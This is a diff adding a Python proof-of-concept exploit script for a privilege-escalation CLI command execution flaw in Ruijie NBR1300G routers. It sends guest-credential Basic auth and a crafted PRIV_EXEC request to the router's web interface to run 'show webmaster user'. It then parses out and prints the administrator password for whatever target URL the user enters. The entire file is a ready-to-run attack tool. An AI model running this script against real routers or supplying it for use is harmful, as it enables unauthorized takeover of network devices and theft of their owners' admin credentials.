@@ -1,0 +1,47 @@
+#!/usr/bin/python3
+#-*- coding:utf-8 -*-
+# author : PeiQi
+# from   : http://wiki.peiqi.tech
+
+import base64
+import requests
+import random
+import re
+import json
+import sys
+
+def title():
+    print('+------------------------------------------')
+    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
+    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
+    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
+    print('+  \033[34mVersion: 锐捷NBRNBR1300G 路由器 越权CLI命令执行漏洞                    \033[0m')
+    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
+    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
+    print('+------------------------------------------')
+
+def POC_1(target_url):
+    vuln_url = target_url + "/WEB_VMS/LEVEL15/"
+    headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
+    }
+    data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.'
+    try:
+        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
+        print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(target_url))
+        if "webmaster" in response.text and " password" in response.text and response.status_code == 200:
+            user_data = re.findall(r'webmaster level 0 username admin password (.*?)<OPTION>', response.text)[0]
+            print("\033[36m[o] 成功获取, 管理员用户账号密码为: admin/{} \033[0m".format(user_data))
+        else:
+            print("\033[31m[x] 请求失败:{} \033[0m")
+    except Exception as e:
+        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
+        sys.exit(0)
+
+#
+if __name__ == '__main__':
+    title()
+    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
+    POC_1(target_url)
